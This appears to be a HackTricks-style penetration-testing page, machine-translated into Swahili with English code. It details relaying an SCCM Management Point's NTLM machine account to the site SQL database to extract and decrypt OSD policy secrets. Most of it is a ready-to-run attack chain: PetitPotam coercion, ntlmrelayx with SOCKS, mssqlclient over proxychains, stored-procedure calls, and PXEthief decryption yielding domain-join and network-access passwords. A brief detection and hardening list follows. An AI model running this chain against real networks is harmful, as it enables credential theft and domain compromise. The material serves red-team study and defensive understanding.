# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kuthibitisha kupitia SMB/RPC na **kupeleka** akaunti ya mashine ya NTLM kwa **hifadhidata ya tovuti (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Hizi ni nafasi zinazokuruhusu kuita seti ya taratibu zilizohifadhiwa zinazofichua **Operating System Deployment (OSD)** blobs (akili za Akaunti ya Upataji wa Mtandao, mabadiliko ya Mchakato, nk.). Blobs zimeandikwa kwa hex/encrypted lakini zinaweza kufichuliwa na kufichuliwa kwa **PXEthief**, zikitoa siri za maandiko.

Mnyororo wa kiwango cha juu:
1. Gundua MP & hifadhidata ya tovuti ↦ mwisho wa HTTP usio na uthibitisho `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Anza `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Lazimisha MP ukitumia **PetitPotam**, PrinterBug, DFSCoerce, nk.
4. Kupitia proxy ya SOCKS ungana na `mssqlclient.py -windows-auth` kama akaunti ya **<DOMAIN>\\<MP-host>$** iliyopelekwa.
5. Tekeleza:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (au `MP_GetPolicyBodyAfterAuthorization`)
6. Ondoa `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Siri kama `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, nk. zinapatikana bila kugusa PXE au wateja.

---

## 1. Kuorodhesha mwisho wa MP usio na uthibitisho
Kiendelezi cha MP ISAPI **GetAuth.dll** kinatoa vigezo kadhaa ambavyo havihitaji uthibitisho (isipokuwa tovuti ni ya PKI pekee):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Inarudisha funguo ya umma ya cheti cha kusaini tovuti + GUIDs za vifaa vyote vya *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Inataja kila Management-Point katika tovuti. |
| `SITESIGNCERT` | Inarudisha cheti cha kusaini cha Tovuti Kuu (tambua seva ya tovuti bila LDAP). |

Pata GUIDs ambazo zitakuwa kama **clientID** kwa maswali ya DB baadaye:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Peleka akaunti ya mashine ya MP kwa MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wakati shinikizo linapowaka unapaswa kuona kitu kama:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Tambua sera za OSD kupitia taratibu zilizohifadhiwa
Unganisha kupitia proxy ya SOCKS (port 1080 kwa chaguo-msingi):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Switch to the **CM_<SiteCode>** DB (tumia msimbo wa tovuti wa tarakimu 3, e.g. `CM_001`).

### 3.1  Tafuta GUIDs za Kompyuta zisizojulikana (hiari)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2 Orodha ya sera zilizotolewa
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Kila safu ina `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Zingatia sera:
* **NAAConfig**  – Akounti za mtandao za NAA
* **TS_Sequence** – Mabadiliko ya kazi (OSDJoinAccount/Password)
* **CollectionSettings** – Inaweza kuwa na akaunti za run-as

### 3.3  Pata mwili kamili
Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kupuuza hitaji la clientID kwa kutumia:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> MUHIMU: Katika SSMS ongeza "Idadi ya Wahusika Waliorejeshwa" (>65535) au blob itakatwa.

---

## 4. Fanya ufafanuzi na ufichuaji wa blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Mfano wa siri zilizorejelewa:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Majukumu na taratibu za SQL zinazohusiana
Wakati wa relay, kuingia kunapangwa kwa:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Majukumu haya yanaonyesha idadi kubwa ya ruhusa za EXEC, zile muhimu zinazotumika katika shambulio hili ni:

| Taratibu Iliyohifadhiwa | Kusudi |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Orodha ya sera zilizotumika kwa `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Rudisha mwili kamili wa sera. |
| `MP_GetListOfMPsInSiteOSD` | Iliyorejeshwa na njia ya `MPKEYINFORMATIONMEDIA`. |

Unaweza kuangalia orodha kamili na:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Ugunduzi & Kuimarisha
1. **Fuatilia logins za MP** – akaunti yoyote ya kompyuta ya MP inayoingia kutoka IP ambayo si mwenyeji wake ≈ relay.
2. Wezesha **Ulinzi wa Kupanuliwa kwa Uthibitishaji (EPA)** kwenye hifadhidata ya tovuti (`PREVENT-14`).
3. Zima NTLM zisizotumika, enforce SMB signing, punguza RPC (
mipango sawa iliyotumika dhidi ya `PetitPotam`/`PrinterBug`).
4. Imarisha mawasiliano ya MP ↔ DB kwa kutumia IPSec / mutual-TLS.

---

## Tazama pia
* Misingi ya NTLM relay:
{{#ref}}
../ntlm/README.md
{{#endref}}

* Unyanyasaji wa MSSQL & baada ya unyanyasaji:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Marejeo
- [Ningependa Kuongea na Meneja Wako: Kuiba Siri kwa Kutumia Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Meneja wa Makosa – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
